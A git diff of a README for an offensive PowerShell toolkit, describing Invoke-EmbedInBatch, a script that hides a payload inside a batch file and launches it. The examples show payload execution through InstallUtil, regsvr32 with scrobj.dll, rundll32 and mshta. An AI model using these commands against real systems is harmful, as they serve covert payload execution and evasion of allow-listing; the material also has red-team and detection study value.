@@ -7,12 +7,12 @@ This repository aims at publishing some of PowerShell scripts. No rocket science
 
 Invoke-EmbedInBatch
 ----------------
-Inspired by @xorrior, this scripts embeds and hide any type of payload within a batch file and then executes it given a command line specified as an argument.
+Inspired by @xorrior, this scripts embeds and hide any type of payload within a batch file and then executes it given a command line specified as an argument. It proposes two different methods for achieving this trick, explained in the script header.
 Examples:
 ```
 Invoke-EmbedInBatch -PayloadPath installUtil.dll -FinalCommandLine "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U _payload_"
 Invoke-EmbedInBatch -PayloadPath regsvr32.sct -FinalCommandLine "regsvr32.exe /s /u /i:_payload_ scrobj.dll"
-Invoke-EmbedInBatch -PayloadPath standard.dll -FinalCommandLine "rundll32.exe _payload_,entrypoint"
+Invoke-EmbedInBatch -PayloadPath standard.dll -Method 2 -FinalCommandLine "rundll32.exe _payload_,entrypoint"
 Invoke-EmbedInBatch -PayloadPath payload.hta -FinalCommandLine "mshta.exe _payload_"
 Invoke-EmbedInBatch -PayloadPath payload.exe -FinalCommandLine "_payload_"
 ```
